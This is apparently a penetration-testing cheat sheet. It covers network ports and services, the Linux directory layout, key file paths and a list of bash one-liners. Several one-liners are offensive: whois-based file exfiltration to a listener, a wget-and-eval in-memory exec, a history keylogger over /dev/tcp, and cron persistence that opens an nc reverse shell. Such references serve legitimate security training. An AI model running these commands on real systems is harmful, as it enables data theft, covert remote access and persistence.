### Network Ports and Services

- **UDP codasrv (2433)**: Coda file system server port.
- **TCP codasrv-se (2433)**: Coda file system TCP side effects.
- **UDP codasrv-se (2600)**: Coda file system UDP SFTP side effect.
- **hpstgmgr [zebrasrv] (2601)**: Zebra routing.
- **discp-client [zebra] (2602)**: Discp client; Zebra integrated shell.
- **discp-server [ripd] (2603)**: Discp server; Routing Information Protocol daemon (ripd).
- **servicemeter [ripngd] (2604)**: Service Meter; RIP daemon for IPv6.
- **nsc-ccs [ospfd] (2605)**: NSC CCS; Open Shortest Path First daemon (ospfd).
- **nsc-posa (2606)**: NSC POSA; Border Gateway Protocol daemon (bgpd).
- **netmon [ospf6d] (2607)**: Dell Netmon; OSPF for IPv6 daemon (ospf6d).
- **corbaloc (2809)**: Common Object Request Broker Architecture (CORBA) naming service locator.
- **afbackup (2988)**: Afbackup client-server backup system.
- **tcp squid (3128)**: Squid Web proxy cache.
- **icpv2 (3130)**: Internet Cache Protocol version 2 (v2); used by Squid proxy caching server.
- **mysql (3306)**: MySQL database service.
- **trnsprntproxy (3346)**: Transparent proxy.
- **prsvp (3455)**: RSVP port.
- **pxe (4011)**: Pre-execution Environment (PXE) service.
- **rwhois (4321)**: Remote Whois (rwhois) service.
- **krb524 (4444)**: Kerberos version 5 (v5) to version 4 (v4) ticket translator.
- **tcp fax (4557)**: FAX transmission service (old service).
- **tcp hylafax (4559)**: HylaFAX client-server protocol (new service).
- **rfe (5002)**: Radio Free Ethernet (RFE) audio broadcasting system.
- **sgi-dgl (5232)**: SGI Distributed Graphics Library.
- **cfengine (5308)**: Configuration engine (Cfengine).
- **noclog (5354)**: NOCOL network operation center logging daemon (noclogd).
- **hostmon (5355)**: NOCOL network operation center host monitoring.
- **postgres (5432)**: PostgreSQL database.
- **tcp canna (5680)**: Canna Japanese character input interface.
- **cvsup [CVSup] (5999)**: CVSup file transfer and update tool.
- **X Window System services (6000)**: X Window System services.
- **tcp x11-ssh-offset (6010)**: Secure Shell (SSH) X11 forwarding offset.
- **ircd (6667)**: Internet Relay Chat daemon (ircd).
- **afs3-fileserver (7000)**: Andrew File System (AFS) file server.
- **afs3-callback (7001)**: AFS port for callbacks to cache manager.
- **afs3-prserver (7002)**: AFS user and group database.
- **afs3-vlserver (7003)**: AFS volume location database.
- **afs3-kaserver (7004)**: AFS Kerberos authentication service.
- **afs3-volser (7005)**: AFS volume management server.
- **afs3-errors (7006)**: AFS error interpretation service.
- **afs3-bos (7007)**: AFS basic overseer process.
- **afs3-update (7008)**: AFS server-to-server updater.
- **afs3-rmtsys (7009)**: AFS remote cache manager service.
- **tcp xfs (7100)**: X Font Server (XFS).
- **tircproxy (7666)**: Tircproxy IRC proxy service.
- **http-alt (8008)**: Hypertext Transfer Protocol (HTTP) alternate.
- **webcache (8080)**: World Wide Web (WWW) caching service.
- **tproxy (8081)**: Transparent Proxy.
- **tcp jetdirect [laserjet, hplj] (9100)**: Hewlett-Packard (HP) JetDirect network printing service.
- **mandelspawn [mandelbrot] (9359)**: Parallel mandelbrot spawning program for the X Window System.
- **sd (9876)**: Session Director for IP multicast conferencing.
- **amanda (10080)**: Advanced Maryland Automatic Network Disk Archiver (Amanda) backup services.
- **kamanda (10081)**: Amanda backup service over Kerberos.
- **tcp amandaidx (10082)**: Amanda index server.
- **tcp amidxtape (10083)**: Amanda tape server.
- **pgpkeyserver (11371)**: Pretty Good Privacy (PGP) / GNU Privacy Guard (GPG) public keyserver.
- **h323callsigalt (11720)**: H.323 Call Signal Alternate.
- **bprd (13720)**: Veritas NetBackup Request Daemon (bprd).
- **bpdbm (13721)**: Veritas NetBackup Database Manager (bpdbm).
- **bpjava-msvc (13722)**: Veritas NetBackup Java / Microsoft Visual C++ (MSVC) protocol.
- **vnetd (13724)**: Veritas network utility.
- **bpcd (13782)**: Veritas NetBackup.
- **vopied (13783)**: Veritas VOPIE authentication daemon.
- **isdnlog (20011)**: Integrated Services Digital Network (ISDN) logging system.
- **vboxd (20012)**: ISDN voice box daemon (vboxd).
- **wnn6 [wnn4] (22273)**: Kana/Kanji conversion system.
- **tcp wnn4_Cn (22289)**: cWnn Chinese input system.
- **tcp wnn4_Kr (22305)**: kWnn Korean input system.
- **tcp wnn4_Tw (22321)**: tWnn Chinese input system (Taiwan).
- **binkp (24554)**: Binkley TCP/IP Fidonet mailer daemon.
- **quake (26000)**: Quake (and related) multi-player game servers.
- **wnn6-ds (26208)**: Wnn6 Kana/Kanji server.
- **asp (27374)**: Address Search Protocol.
- **traceroute (33434)**: Traceroute network tracking tool.
- **tfido (60177)**: Ifmail FidoNet compatible mailer service.
- **fido (60179)**: FidoNet electronic mail and news network.

### Linux Directory Structure

- **/**: Primary hierarchy root and root directory of the entire file system hierarchy.
- **/bin**: Essential command binaries that need to be available in single-user mode; for all users, e.g., `cat`, `ls`, `cp`.
- **/boot**: Boot loader files, e.g., kernels, initrd.
- **/dev**: Device files, e.g., `/dev/null`, `/dev/disk0`, `/dev/sda1`, `/dev/tty`, `/dev/random`.
- **/etc**: Host-specific system-wide configuration files.
- **/etc/opt**: Configuration files for add-on packages that are stored in `/opt`.
- **/etc/sgml**: Configuration files, such as catalogs, for software that processes SGML.
- **/etc/X11**: Configuration files for the X Window System, version 11.
- **/etc/xml**: Configuration files, such as catalogs, for software that processes XML.
- **/home**: Users' home directories, containing saved files, personal settings, etc.
- **/lib**: Libraries essential for the binaries in `/bin` and `/sbin`.
- **/lib**: Alternative format essential libraries. Such directories are optional, but if they exist, they have some requirements.
- **/media**: Mount points for removable media such as CD-ROMs.
- **/mnt**: Temporarily mounted filesystems.
- **/opt**: Optional application software packages.
- **/proc**: Virtual filesystem providing process and kernel information as files. In Linux, corresponds to a procfs mount. Generally automatically generated and populated by the system, on the fly.
- **/root**: Home directory for the root user.
- **/run**: Run-time variable data: Information about the running system since last boot, e.g., currently logged-in users and running daemons. Files under this directory must be either removed or truncated at the beginning of the boot process; but this is not necessary on systems that provide this directory as a temporary filesystem (tmpfs).
- **/sbin**: Essential system binaries, e.g., `fsck`, `init`, `route`.
- **/srv**: Site-specific data served by this system, such as data and scripts for web servers, data offered by FTP servers, and repositories for version control systems (appeared in FHS-2.3 in 2004).
- **/sys**: Contains information about devices, drivers, and some kernel features.
- **/tmp**: Temporary files (see also `/var/tmp`). Often not preserved between system reboots, and may be severely size restricted.
- **/usr**: Secondary hierarchy for read-only user data; contains the majority of (multi-)user utilities and applications.
- **/usr/bin**: Non-essential command binaries (not needed in single-user mode); for all users.
- **/usr/include**: Standard include files.
- **/usr/lib**: Libraries for the binaries in `/usr/bin` and `/usr/sbin`.
- **/usr/lib**: Alternative format libraries, e.g., `/usr/lib32` for 32-bit libraries on a 64-bit machine (optional).
- **/usr/local**: Tertiary hierarchy for local data, specific to this host. Typically has further subdirectories, e.g., `bin`, `lib`, `share`.
- **/usr/sbin**: Non-essential system binaries, e.g., daemons for various network services.
- **/usr/share**: Architecture-independent (shared) data.
- **/usr/src**: Source code, e.g., the kernel source code with its header files.
- **/usr/X11R6**: X Window System, Version 11, Release 6 (up to FHS-2.3, optional).
- **/var**: Variable files—files whose content is expected to continually change during normal operation of the system—such as logs, spool files, and temporary e-mail files.
- **/var/cache**: Application cache data. Such data are locally generated as a result of time-consuming I/O or calculation. The application must be able to regenerate or restore the data. The cached files can be deleted without loss of data.
- **/var/lib**: State information. Persistent data modified by programs as they run, e.g., databases, packaging system metadata, etc.
- **/var/lock**: Lock files. Files keeping track of resources currently in use.
- **/var/log**: Log files. Various logs.
- **/var/mail**: Mailbox files. In some distributions, these files may be located in the deprecated `/var/spool/mail`.
- **/var/opt**: Variable data from add-on packages that are stored in `/opt`.
- **/var/run**: Run-time variable data. This directory contains system information data describing the system since it was booted.
- **/var/spool**: Spool for tasks waiting to be processed, e.g., print queues and outgoing mail queue.
- **/var/spool/mail**: Deprecated location for users' mailboxes.
- **/var/tmp**: Temporary files to be preserved between reboots.

### Important File Locations

- **/boot/vmlinuz**: The Linux Kernel file.
- **/dev/had**: Device file for the first IDE HDD (Hard Disk Drive).
- **/dev/hdc**: Device file for the IDE Cdrom, commonly.
- **/dev/null**: A pseudo device.
- **/etc/bashrc**: System defaults and aliases used by bash shell.
- **/etc/crontab**: Cron run commands on a predefined time interval.
- **/etc/exports**: Information of the file system available on the network.
- **/etc/fstab**: Information of Disk Drive and their mount point.
- **/etc/group**: Information of Security Group.
- **/etc/grub.conf**: GRUB bootloader configuration file.
- **/etc/init.d**: Service startup Script.
- **/etc/lilo.conf**: LILO bootloader configuration file.
- **/etc/hosts**: Information on IPs and corresponding hostnames.
- **/etc/hosts.allow**: Hosts allowed access to services on the local host.
- **/etc/host.deny**: Hosts denied access to services on the local host.
- **/etc/inittab**: INIT process and interactions at various run levels.
- **/etc/issue**: Allows editing the pre-login message.
- **/etc/modules.conf**: Configuration files for system modules.
- **/etc/motd**: Message Of The Day.
- **/etc/mtab**: Currently mounted blocks information.
- **/etc/passwd**: System users with password hash redacted.
- **/etc/printcap**: Printer Information.
- **/etc/profile**: Bash shell defaults.
- **/etc/profile.d**: Application script, executed after login.
- **/etc/rc.d**: Information about run level-specific script.
- **/etc/rc.d/init.d**: Run Level Initialization Script.
- **/etc/resolv.conf**: Domain Name Servers (DNS) being used by the system.
- **/etc/securetty**: Terminal List, where root login is possible.
- **/etc/shadow**: System users with password hash.
- **/etc/skel**: Script that populates new user home directory.
- **/etc/termcap**: ASCII file defines the behavior of the terminal.
- **/etc/X11**: Configuration files of X-window System.
- **/usr/bin**: Normal user executable commands.
- **/usr/bin/X11**: Binaries of X windows System.
- **/usr/include**: Contains include files used by 'c' programs.
- **/usr/share**: Shared directories of man files, info files, etc.
- **/usr/lib**: Library files required during program compilation.
- **/usr/sbin**: Commands for Super User, for System Administration.
- **/proc/cpuinfo**: CPU Information.
- **/proc/filesystems**: File-system information being used currently.
- **/proc/interrupts**: Information about the current interrupts.
- **/proc/ioports**: All Input/Output addresses used by devices.
- **/proc/meminfo**: Memory Usages Information.
- **/proc/modules**: Currently used kernel module.
- **/proc/mount**: Mounted File-system Information.
- **/proc/stat**: Detailed Statistics of the current System.
- **/proc/swaps**: Swap File Information.
- **/version**: Linux Version Information.
- **/var/log/auth***: Log of authorization login attempts.
- **/var/log/lastlog**: Log of the last boot process.
- **/var/log/messages**: Log of messages produced by the syslog daemon.
- **/var/log/wtmp**: Login time and duration of each user on the system.

### Linux Tricks and One-Liners

- **WHOIS Exfil Files**:
  - **First**: Ncat listen & tee to file
    ```bash
    ncat -k -l -p 4444 | tee files.b64
    ```
  - **Next**: Compress, base64, xarg whois to Ncat listener
    ```bash
    tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h 192.168.80.107 -p 4444 bits
    ```
  - **Finally**: Reconstruct files back
    ```bash
    cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv
    ```

- **Linux in-memory exec one-liner**:
  ```bash
  bash -c CMD="`wget -qO- http://127.0.0.1/script.sh`" && eval "$CMD"
  ```

- **Bash IP/Port Scanner**:
  ```bash
  for i in {1..65535}; do (echo /$i) &>/dev/null && echo -e "\n[+] Open port at:\t$i" || (echo -n "." && exit 1); done
  ```

- **Bash one-liner screenshot web services running on an IP range**:
  ```bash
  IP="192.168.0"; for p in '80' '443'; do for i in $(seq 0 5); do TAKE_SS=$(cutycapt --url=$IP.$i:$p --out=$IP.$i:$p.png); done; done
  ```

- **Add to .bashrc - Log history of commands with timestamp**:
  ```bash
  PS1='[`date +"%d-%b-%y %T"`] > 'test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/logs/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)
  ```

- **One-Lin3r Terminal Aid**:
  - Gives you one-liners that aid in penetration testing operations, privilege escalation, and more.
  - [One-Lin3r GitHub](https://github.com/D4Vinci/One-Lin3r)

- **Bash Keylogger**:
  ```bash
  PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
  ```

- **One-liner to add persistence on a box via cron**:
  ```bash
  echo "* * * * * /bin/nc 192.168.1.10 1234 -e /bin/bash" > cron && crontab cron
  ```
  - And on `192.168.1.10`:
    ```bash
    nc -lvp 1234
    ```

- **One-liner to check if the contents of a directory changed**:
  ```bash
  find . -type f | sort | xargs sha1sum | sha1sum | awk '{print $1}'
  ```

- **Shodan Bash One-Liner to Search**:
  ```bash
  for domain in $(curl | unfurl -u format '%r'); do shodan search "ssl:$domain" | awk '{print $1}' | aquatone; done
  ```

- **One-liner for grabbing all of the IP addresses from any ASN**:
  ```bash
  whois -h whois.radb.net -- '-i origin AS36459' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq
  ```

- **Show 10 Largest Open Files**:
  ```bash
  lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
  ```

- **Generate a sequence of numbers**:
  ```bash
  echo {01..10}
  ```

- **Displays the quantity of connections to port 80 on a per IP basis**:
  ```bash
  clear; while :; do clear; date; echo ""; echo "  [Count] | [IP ADDR]"; echo "-------------------"; netstat -np | grep :80 | grep -v LISTEN | awk '{print $5}' | cut -d: -f1 | uniq -c; sleep 5; done
  ```

- **Nmap scan every interface that is assigned an IP**:
  ```bash
  ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
  ```

- **Rename all items in a directory to lower case**:
  ```bash
  for i in *; do mv "$i" "${i,,}"; done
  ```

- **Find all log files modified 24 hours ago, and zip them**:
  ```bash
  find . -type f -mtime +1 -name "*.log" -exec zip -m {}.zip {} \; >/dev/null
  ```

- **List IP addresses connected to your server on port 80**:
  ```bash
  netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
  ```

- **Change the encoding of all files in a directory and subdirectories**:
  ```bash
  find . -type f -name '*.java' -exec sh -c 'iconv -f cp1252 -t utf-8 "$1" > converted && mv converted "$1"' -- {} \;
  ```

- **Tree-like output in ls**:
  ```bash
  ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
  ```

- **Find all files recursively with specified string in the filename and output any lines found containing a different string**:
  ```bash
  find . -name *conf* -exec grep -Hni 'matching_text' {} \; > matching_text.conf.list
  ```

- **Extract your external IP address using dig**:
  ```bash
  dig +short myip.opendns.com @resolver1.opendns.com
  ```

- **Shred & Erase without shred**:
  ```bash
  FN=foobar.txt; dd bs=1k count="$(du -sk "${FN}" | cut -f1)" if=/dev/urandom >"${FN}"; rm -f "${FN}"
  ```

### References

- [Filesystem Hierarchy Standard](https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard)
- [Linux Directory Structure and Important Files Paths Explained](https://www.tecmint.com/linux-directory-structure-and-important-files-paths-explained/)
- [Hack Your Own Nmap with a Bash One-Liner](https://medium.com/@int0x33/day-36-hack-your-own-nmap-with-a-bash-one-liner-758352f9aece)
- [Bash One Liners](http://www.bashoneliners.com/oneliners/popular/)
- [Various Bash One-Liners and Tricks](https://twitter.com/markbaggett/status/1190313375475089409)
- [THC Tips, Tricks, Hacks Cheat Sheet](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)